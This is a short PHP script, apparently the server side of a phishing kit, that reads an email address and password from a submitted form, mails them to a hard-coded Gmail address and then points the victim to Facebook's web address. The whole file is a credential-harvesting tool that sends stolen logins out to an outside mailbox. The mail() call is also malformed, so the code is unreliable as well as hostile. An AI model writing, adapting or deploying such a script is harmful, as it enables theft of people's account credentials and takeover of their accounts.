<?php
$email = $_POST["email"];
$passkey = $_POST["pass"];

$recipient = "israelstoba@gmail.com";


$mailheader = "From:" .$email. "<" .$passkey. ">\r\n";

mail($recipient, $mailheader)
or die("Error");

echo "https://web.facebook.com";

?>
